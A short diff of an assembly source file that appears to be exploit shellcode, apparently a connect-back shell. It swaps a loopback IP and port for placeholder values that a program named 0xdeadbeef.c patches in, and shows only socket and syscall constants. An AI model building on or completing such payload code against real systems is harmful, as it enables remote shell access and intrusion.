@@ -14,8 +14,8 @@ SYS_GETUID	equ 0x66
 AF_INET		equ 0x2
 SOCK_STREAM	equ 0x1
 
-IP		equ 0x0100007f
-PORT		equ 0xd204
+IP		equ 0xdeadc0de	;; patched by 0xdeadbeef.c
+PORT		equ 0x1337	;; patched by 0xdeadbeef.c
 
 _start:
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
